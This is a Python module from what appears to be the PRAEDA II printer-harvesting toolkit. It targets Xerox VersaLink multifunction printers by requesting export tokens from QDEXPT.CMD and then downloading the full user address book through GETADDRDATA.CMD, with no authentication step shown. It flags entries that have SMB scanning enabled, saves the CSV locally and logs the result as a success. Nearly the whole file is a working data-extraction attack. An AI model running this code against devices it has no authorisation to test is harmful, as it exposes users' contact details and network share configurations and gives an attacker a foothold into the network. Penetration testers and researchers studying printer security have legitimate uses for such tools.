# Xerox retrieve the user address book if it contains data and also check to see if SMB is enabled
######################################################
#                 PRAEDA II Module #MP0002           #
#                  Copyright (C) 2024                #
#              Deral 'percent_x' Heiland             #
######################################################
# this module will work on the following Xerox models
#      VersaLink C7020,C7025,C7130,B7030,B7125
#
#
#####################################################
import requests
import csv
from io import StringIO

def MP0002(TARGET, PORTS, web, OUTPUT, LOGFILE, data1):
    # Set global variables
    count = 1

    # Open output file for logging
    try:
        with open(f'{OUTPUT}/{LOGFILE}.log', 'a') as logFile:

# URL for the initial request
            url = f"http{web}://{TARGET}:{PORTS}/QDEXPT.CMD?DELIMITER=comma"

# Make the HTTP(s) request
            response = requests.get(url, verify=False)

# Check if the request was successful
            if response.status_code == 200:
    # Parse the JSON response
                data = response.json()

    # Extract the required fields from the response
                file_name = data.get("fileName")
                spool_file = data.get("spoolFile")
                timer_id = data.get("timerID")

    # Verify that all fields are present
                if file_name and spool_file and timer_id:
                    print(f"Attemping to retreive Address book from Xerox MFP {TARGET}")
                else:
                    print("Error: Missing one or more required fields in the response from Xerox MFP.\n")
                    return
            else:
                print(f"Failed to fetch data. Status code: {response.status_code}")

# URL to post data back
            new_url = f"http{web}://{TARGET}:{PORTS}/GETADDRDATA.CMD?FILE={file_name}&SPOOLFILE={spool_file}&TIMERID={timer_id}"

# Make the second HTTP request
            new_response = requests.get(new_url, verify=False)

# Check if the request was successful
            if new_response.status_code == 200:
                # Check if the CSV has more than one line
                if len(new_response.text.strip().split('\n')) > 1:
                    # Convert response text to a CSV reader object
                    csv_data = csv.reader(StringIO(new_response.text))
                    # Skip the header
                    next(csv_data, None)

                    # Initialize a flag to check for SMB protcol enabled in column 16
                    smb_enabled = False
                    for row in csv_data:
                        if len(row) >= 16 and row[15] == '3':  # Remember, column indices start at 0
                            smb_enabled = True
                            break  # No need to check further, we found an entry with SMB enabled
                    if smb_enabled:
                        print(f"\033[91mSUCCESS\033[0m:SMB Scan is enabled in Xerox Address book")
                        logFile.write(f"\033[91mSUCCESS\033[0m:0:SMB Scan is enabled in Xerox Address book:{TARGET}:{PORTS}:{data1}xxx:::::\n")

                    # Save the CSV file to the file system
                    with open(f'./{OUTPUT}/{TARGET}_{PORTS}_{file_name}', 'a') as file:
                        file.write(new_response.text)
                    print(f"\033[91mSUCCESS\033[0m: Xerox Address book CSV file saved as {TARGET}_{PORTS}_{file_name}\n")
                    logFile.write(f"\033[91mSUCCESS\033[0m:4:Xerox Address book:{TARGET}:{PORTS}:{data1}xxx:::{TARGET}_{PORTS}_{file_name}::")

                else:
                    print(f"ABORTED: Xerox Address book file is empty, not saved.\n")
                    logFile.write(f"ABORTED:4:Xerox Address book file is empty, not saved:{TARGET}:{PORTS}:{data1}xxx:::::\n")
            else:
                print(f"FAILED: to fetch CSV data. Status code: {new_response.status_code}\n")
                logFile.write(f"FAILED:4:Xerox Address book file recovery failed:{TARGET}:{PORTS}:{data1}xxx:::::")
    except Exception as e:
        print(f"Failed to open output file {OUTPUT}\nError: {str(e)}")

